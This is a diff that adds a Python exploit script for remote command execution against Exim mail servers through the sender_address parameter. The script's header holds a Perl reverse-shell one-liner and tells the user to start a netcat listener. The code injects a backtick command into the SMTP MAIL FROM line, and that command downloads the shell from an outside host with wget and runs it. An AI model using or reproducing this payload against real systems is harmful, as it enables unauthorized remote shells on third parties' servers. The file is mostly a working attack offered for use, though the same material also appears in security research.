@@ -1,0 +1,111 @@
+#!/usr/bin/env python
+
+##################################################################################
+##      Exim sender_address Parameter - Remote Command Execution Exploit        ##
+##################################################################################
+##                                                                              ##
+## Vulnerability found by RedTeam Pentesting GmbH                               ##
+## https://www.redteam-pentesting.de/en/advisories/rt-sa-2013-001/              ##
+##                                                                              ##
+## Exploit written by eKKiM                                                     ##
+## http://rdtx.eu/exim-with-dovecot-lda-rce-exploit/                            ##
+##                                                                              ## 
+##################################################################################
+##                                    USAGE                                     ##
+##################################################################################
+##                                                                              ##
+## Edit the PERL REVERSE SHELL MY_CONNECTBACK_IP and MY_CONNECTBACK_PORT and   ##
+## upload this perl reverse shell script to a webserver.                        ##
+##                                                                              ## 
+## Edit the PERL_SHELL variable to your own connectback script URL              ##
+##                                                                              ##
+## Start a listener: nc -vvn -l -p CONNECT_BACK_PORT                            ##
+##                                                                              ## 
+## Let the exploitin begin                                                      ##
+##                                                                              ## 
+##################################################################################
+
+
+####### PERL REVERSE SHELL #######
+## use Socket;$i="MY_CONNECTBACK_IP";$p=MY_CONNECTBACK_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
+####### PERL REVERSE SHELL #######
+
+
+import socket
+import sys
+
+####### URL TO YOUR CONNECTBACK SHELL #######
+PERL_SHELL = "myhost.com/shell.pl"
+####### URL TO YOUR CONNECTBACK SHELL #######
+
+if len(sys.argv) != 2:
+	print "Usage: exim_exploit.py <target_ip> <optional_rcpt_address>"
+	print " <target_ip> target you want to test"
+	print " <optional_rcpt_address> an address which is accepted by exim (default: postmaster@localhost)"
+	exit(1)
+
+RCPT_TO = "postmaster@localhost" 
+HOST = sys.argv[1]
+PORT = 25
+
+def read_line(s):
+    ret = ''
+
+    while True:
+        c = s.recv(1)
+
+        if c == '\n' or c == '':
+            break
+        else:
+            ret += c
+
+    return ret
+
+
+if len(sys.argv) == 3:
+	RCPT_TO = sys.argv[2]
+	
+print "Exim sender_address Parameter - Remote Command Execution Exploit"
+print "Bug discovered by RedTeam Pentesting GmbH"
+print "Exploit created by eKKiM"
+print ""
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+data = read_line(s);
+if not(data.startswith("220")):
+	print "[ERROR] Is it SMTP Server?"
+	exit(1)
+	
+s.send("EHLO domain.local\n")
+s.recv(4096)
+
+s.send("MAIL FROM: x`wget${IFS}-O${IFS}/tmp/p.pl${IFS}" + PERL_SHELL + "``perl${IFS}/tmp/p.pl`@blaat.com\n")
+
+data = read_line(s);
+if not(data.startswith("250")):
+	print "[ERROR] MAIL FROM not accepted"
+	exit(1)
+
+s.send("RCPT TO: " + RCPT_TO + "\n")
+data = read_line(s);
+if not(data.startswith("250")):
+	print "[ERROR] RCPT_TO not accepted"
+	exit(1)
+
+s.send("DATA\n")
+data = read_line(s);
+if not(data.startswith("354")):
+	print "[ERROR] Cannot send email content"
+	exit(1)
+	
+s.send("x\n.\n")
+data = read_line(s);
+if not(data.startswith("250")):
+	print "[ERROR] email content revoked"
+	exit(1)
+	
+print "[OK] Recieved shell?"
+
+s.close()
